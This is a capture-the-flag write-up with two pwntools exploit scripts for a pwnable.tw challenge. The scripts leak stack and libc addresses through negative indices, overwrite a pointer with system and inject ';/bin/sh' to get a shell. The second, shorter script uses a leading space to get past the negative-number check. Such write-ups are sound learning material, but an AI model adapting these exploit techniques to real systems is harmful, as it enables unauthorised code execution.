```python
#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2019 hal

from pwn import *

context.log_level = "debug"
context.terminal = ['tmux', 'split', '-h']

pwn_file = ("./pwn")
elf = ELF(pwn_file)
libc = ELF("./bc.so.6")

if len(sys.argv) == 1:
    r = process(pwn_file)
    pid = r.pid
else:
    r = remote("chall.pwnable.tw", 10202)
    pid = 0

def debug():
    gdb.attach(r, "b *0x0804A65D")

# write plt['puts'] into name ptr
# use negative integer to hijack control flow
# first leak stack
r.sendafter("> ", '6')
r.sendafter("> ", '2')
r.sendafter("name: ", 'a'*0x5c + p32(elf.plt['puts']) + 'a'*4)
r.sendafter("> ", '-10')
r.recv(4)
stack = u32(r.recv(4)) - 0xb0
info("stack: " + hex(stack))

# second leak libc
r.sendlineafter("> ", "1")
r.sendafter("> ", "-10"+'a'*(0x80-3))
r.recv(0x80)
a = u32(r.recv(4)) - 0x9768 
info("libc: " + hex(a))
libc.address = a

# last hijack control flow to stack and call system("*;/bin/sh\x00")
# note: * can't be negative
sh = str((stack+0x14-0x8058154)/4).ljust(0xb, 'a')
sh += ";"
sh += "/bin/sh\x00"
sh += p32(libc.sym['system'])
r.sendafter("> ", sh)

r.interactive()
```
### Easier Solution
After seeing others' writeup, I found a easier way to get shell.

We know system("-10;/bin/sh\x00") will cause error because -10 is negative. But we can bypass it with just a space before the negative number, like system(" -10;/bin/sh\x00")

And strtol works ok with a space.

```python
# leak libc
r.sendafter("> ", '6')
r.sendafter("> ", '2')
r.sendafter("name: ", p32(elf.plt['puts']) + 'a')
r.sendafter("> ", "-33"+'a'*(0x80-3))
r.recv(0x80)
a = u32(r.recv(4)) - 0x9768 
info("libc: " + hex(a))
libc.address = a
r.sendlineafter("> ", '1')

# call system(" -33;/bin/sh\x00")
r.sendafter("> ", '6')
r.sendafter("> ", '2')
r.sendafter("name: ", p32(libc.sym['system']) + 'a')
r.sendafter("> ", ' -33;/bin/sh\x00')

r.interactive()
```